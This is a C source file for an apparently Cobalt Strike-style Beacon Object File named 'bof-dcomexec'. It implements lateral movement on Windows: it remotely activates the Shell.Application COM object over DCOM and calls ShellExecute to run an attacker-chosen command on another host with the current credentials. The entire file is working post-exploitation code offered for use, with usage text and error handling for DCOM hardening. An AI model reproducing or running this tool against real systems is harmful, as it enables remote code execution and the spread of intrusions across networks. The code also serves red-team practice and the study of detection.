/*
 * bof-dcomexec <host> <command> [args]
 *
 * Lateral execution through the Shell.Application COM object (DCOM).  The
 * object is activated on the remote host and ShellExecute is called through
 * IDispatch.  This is the "ShellWindows / ShellBrowserWindow" family of
 * DCOM execution.
 *
 * Notes: DCOM hardening on modern Windows can deny remote activation of
 * Shell.Application; the HRESULT is printed so you can tell.  `host` must be
 * a NetBIOS name or IP; current credentials are used.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const GUID bof_clsid_shell =
    {0x13709620, 0xc279, 0x11ce, {0xa4, 0x9e, 0x44, 0x45, 0x53, 0x54, 0x00, 0x00}};
static const GUID bof_iid_idispatch =
    {0x00020400, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
static const GUID bof_iid_null =
    {0x00000000, 0x0000, 0x0000, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}};

void go(char *args, int alen)
{
    datap parser;
    char *host, *command, *extra = "";
    int hlen, clen, elen;
    wchar_t whost[256], wfile[1024], wargs[1024];
    COSERVERINFO si;
    COAUTHINFO ai;
    MULTI_QI qi;
    IDispatch *disp = NULL;
    OLECHAR *name = L"ShellExecute";
    DISPID dispid = 0;
    VARIANT argv[4];
    DISPPARAMS dp;
    EXCEPINFO ei;
    UINT argerr = 0;
    HRESULT hr;
    int coinit = 0, i;

    BeaconDataParse(&parser, args, alen);
    host    = BeaconDataExtract(&parser, &hlen);
    command = BeaconDataExtract(&parser, &clen);
    extra   = BeaconDataExtract(&parser, &elen);
    if (!host || !host[0] || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: dcomexec <host|.> <command> [args]\n");
        return;
    }
    if (!extra) extra = "";

    for (i = 0; i < 4; i++)
        OLEAUT32$VariantInit(&argv[i]);

    if (bof_a2w(command, wfile, 1024) <= 0 ||
        bof_a2w(extra, wargs, 1024) < 0 ||
        bof_a2w(host, whost, 256) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "argument too long\n");
        return;
    }

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) coinit = 1;
    else if (hr != (HRESULT)0x80010106L) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx: 0x%08lx\n", (unsigned long)hr);
        return;
    }

    bof_memzero(&si, sizeof(si));
    bof_memzero(&ai, sizeof(ai));
    ai.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    ai.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    ai.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
    ai.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;

    si.pwszName = whost;
    si.pAuthInfo = &ai;

    qi.pIID = &bof_iid_idispatch;
    qi.pItf = NULL;
    qi.hr = 0;

    hr = OLE32$CoCreateInstanceEx(&bof_clsid_shell, NULL, CLSCTX_REMOTE_SERVER,
                                  &si, 1, &qi);
    if (FAILED(hr) || !qi.pItf) {
        BeaconPrintf(CALLBACK_ERROR,
                     "CoCreateInstanceEx(Shell.Application@%s): 0x%08lx\n", host,
                     (unsigned long)(FAILED(hr) ? hr : qi.hr));
        if (coinit) OLE32$CoUninitialize();
        return;
    }
    disp = (IDispatch *)qi.pItf;

    hr = disp->lpVtbl->GetIDsOfNames(disp, &bof_iid_null, &name, 1,
                                     LOCALE_USER_DEFAULT, &dispid);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "GetIDsOfNames(ShellExecute): 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    for (i = 0; i < 4; i++)
        argv[i].vt = VT_BSTR;
    /* DISPPARAMS are reversed: rgvarg[0] is the last argument. */
    argv[0].bstrVal = OLEAUT32$SysAllocString(L"open");   /* Operation */
    argv[1].bstrVal = OLEAUT32$SysAllocString(L"");       /* Directory */
    argv[2].bstrVal = OLEAUT32$SysAllocString(wargs);     /* Parameters */
    argv[3].bstrVal = OLEAUT32$SysAllocString(wfile);     /* File */

    if (!argv[0].bstrVal || !argv[1].bstrVal ||
        !argv[2].bstrVal || !argv[3].bstrVal) {
        BeaconPrintf(CALLBACK_ERROR, "SysAllocString failed\n");
        goto cleanup;
    }

    bof_memzero(&dp, sizeof(dp));
    dp.rgvarg = argv;
    dp.cArgs = 4;
    bof_memzero(&ei, sizeof(ei));

    hr = disp->lpVtbl->Invoke(disp, dispid, &bof_iid_null, LOCALE_USER_DEFAULT,
                              DISPATCH_METHOD, &dp, NULL, &ei, &argerr);
    if (SUCCEEDED(hr))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ShellExecute fired on %s: %ls %ls\n",
                     host, wfile, wargs);
    else
        BeaconPrintf(CALLBACK_ERROR, "[-] Invoke(ShellExecute): 0x%08lx%s\n",
                     (unsigned long)hr,
                     (hr == (HRESULT)0x80070005L) ? " (access denied / DCOM hardening)" : "");

cleanup:
    OLEAUT32$VariantClear(&argv[0]);
    OLEAUT32$VariantClear(&argv[1]);
    OLEAUT32$VariantClear(&argv[2]);
    OLEAUT32$VariantClear(&argv[3]);
    if (disp) disp->lpVtbl->Release(disp);
    if (coinit) OLE32$CoUninitialize();
}
